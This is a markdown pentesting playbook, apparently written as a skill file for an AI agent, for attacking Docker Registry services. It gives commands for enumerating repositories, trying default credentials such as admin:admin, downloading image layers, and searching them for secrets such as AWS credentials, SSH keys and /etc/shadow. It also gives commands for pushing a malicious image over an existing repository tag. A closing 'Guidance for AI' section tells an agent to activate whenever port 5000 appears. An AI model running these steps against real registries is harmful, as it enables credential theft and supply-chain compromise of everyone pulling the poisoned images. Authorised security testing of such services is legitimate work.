# Docker Registry Pentesting Skill

## Goal

Identify and exploit vulnerabilities in Docker Registry services to extract images and sensitive data.

## Port

- **5000** - Docker Registry (default HTTP)
- **443** - Docker Registry (HTTPS)

## Methodology

1. **Identify Registry:** Scan for Docker Registry ports
2. **Check Authentication:** Test for anonymous access
3. **List Repositories:** Enumerate available images
4. **Download Images:** Pull interesting images
5. **Extract Secrets:** Find credentials and sensitive data in layers

## Enumeration

```bash
# Nmap scan
nmap -sV -p 5000 <target>

# Check registry API
curl http://<target>:5000/v2/

# List repositories
curl http://<target>:5000/v2/_catalog
```

## API Endpoints

```bash
# Check API version
curl http://<target>:5000/v2/

# List all repositories
curl http://<target>:5000/v2/_catalog

# List tags for a repository
curl http://<target>:5000/v2/<repo>/tags/list

# Get image manifest
curl http://<target>:5000/v2/<repo>/manifests/<tag>
curl http://<target>:5000/v2/<repo>/manifests/latest
```

## Downloading Images

```bash
# Using Docker directly
docker pull <target>:5000/<repo>:<tag>

# For insecure registry, add to daemon.json:
# {"insecure-registries" : ["<target>:5000"]}

# Using crane
crane pull <target>:5000/<repo>:<tag> image.tar
```

## Extracting Layer Blobs

```bash
# Get manifest to find layers
curl http://<target>:5000/v2/<repo>/manifests/latest

# Download specific layer
curl http://<target>:5000/v2/<repo>/blobs/<digest> -o layer.tar.gz

# Extract layer
tar -xzf layer.tar.gz
```

## Analyzing Images for Secrets

```bash
# Extract and search image
docker save <image> -o image.tar
tar -xf image.tar
find . -name "*.json" -exec grep -l password {} \;

# Check history for secrets
docker history <image> --no-trunc

# Using dive for layer analysis
dive <image>
```

## Authentication Bypass

```bash
# Test for no auth
curl http://<target>:5000/v2/_catalog

# Test basic auth with defaults
curl -u admin:admin http://<target>:5000/v2/_catalog
curl -u registry:registry http://<target>:5000/v2/_catalog

# Check for token auth
curl http://<target>:5000/v2/
# WWW-Authenticate header reveals auth method
```

## Image Manipulation (if writable)

```bash
# Push malicious image
docker tag malicious:latest <target>:5000/<existing_repo>:latest
docker push <target>:5000/<existing_repo>:latest
```

## Common Secrets in Images

```bash
# Files to check
/root/.aws/credentials
/root/.ssh/id_rsa
/app/.env
/app/config.json
/etc/passwd
/etc/shadow
```

## Tools

* **crane** - Container registry tool
* **dive** - Docker image layer explorer
* **docker-registry-grabber** - Registry enumeration
* **Nmap** - Service detection

## Guidance for AI

* Activate when port 5000 or Docker Registry found
* Anonymous access is common misconfiguration
* Image layers may contain committed secrets
* Check image history for ENV vars with secrets
* Writable registries allow supply chain attacks
* Private registries may contain proprietary code
